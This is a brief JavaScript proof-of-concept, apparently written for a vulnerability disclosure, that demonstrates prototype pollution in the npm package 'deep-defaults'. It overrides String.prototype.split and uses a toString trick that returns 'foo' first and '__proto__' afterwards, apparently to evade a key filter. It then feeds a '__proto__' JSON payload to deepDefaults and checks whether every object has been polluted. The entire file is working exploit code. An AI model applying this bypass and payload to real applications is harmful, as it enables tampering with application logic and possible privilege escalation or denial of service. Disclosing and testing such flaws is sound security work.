var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var deepDefaults = require('deep-defaults');
var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
var obj = {};
console.log({}.polluted);
deepDefaults(obj, JSON.parse(malicious_payload));
console.log({}.polluted);